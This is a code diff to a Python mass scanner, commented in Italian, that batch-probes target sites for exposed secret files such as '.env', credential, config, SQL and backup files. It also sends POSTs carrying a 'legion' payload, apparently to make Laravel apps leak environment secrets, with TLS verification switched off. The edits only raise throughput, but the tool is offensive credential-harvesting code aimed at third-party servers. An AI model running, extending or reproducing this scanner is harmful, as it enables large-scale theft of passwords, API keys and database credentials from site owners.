@@ -318,8 +318,8 @@ def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
         if b"popbox.fun" in content_lower:
             return True, False
             
-        head = next(r.iter_content(chunk_size=100))
-        if b'<html' not in head.lower() and b'<!doctype' not in head.lower() and b'<body' not in head.lower():
+        head = content_lower[:100]
+        if b'<html' not in head and b'<!doctype' not in head and b'<body' not in head:
             return False, True
     except Exception:
         pass
@@ -442,8 +442,8 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
         # 1. Scansione preliminare ENV
         env_batches = site_payloads.get('env', [])
         for batch in env_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
-            merdb = grequests.map(reqss)
+            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
+            merdb = grequests.map(reqss, size=50)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                     checked += 1
@@ -460,8 +460,8 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
         # 2. Scansione preliminare PHP
         php_batches = site_payloads.get('php', [])
         for batch in php_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
-            merdb = grequests.map(reqss)
+            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
+            merdb = grequests.map(reqss, size=50)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                     checkeds += 1
@@ -482,12 +482,12 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
             url_lower_check = url.lower()
             is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
             if is_static:
-                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
+                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
             else:
-                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
+                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
             findfile_requests.append(req)
             
-        responsesf = grequests.map(findfile_requests)
+        responsesf = grequests.map(findfile_requests, size=50)
         unique_responses = {}
         for r in responsesf:
             if r is not None and r.status_code in [200, 206, requests.codes.ok]:
@@ -641,10 +641,10 @@ def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False)
     logger.info(f"[SCANNER] Controllo blocco di {len(urls_list)} target...")
     try:
         resp_site = [
-            grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
+            grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
             for url in urls_list
         ]
-        merdb = grequests.map(resp_site)
+        merdb = grequests.map(resp_site, size=50)
         hosts_by_site = {}
         for r in merdb:
             if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
@@ -666,10 +666,10 @@ def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False)
         if retry_urls:
             logger.info(f"[SCANNER] Retry su {len(retry_urls)} target con protocollo alternativo...")
         resp_retry = [
-            grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
+            grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
             for url in retry_urls
         ]
-        retry_responses = grequests.map(resp_retry)
+        retry_responses = grequests.map(resp_retry, size=50)
         for r in retry_responses:
             if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                 site_url = r.url
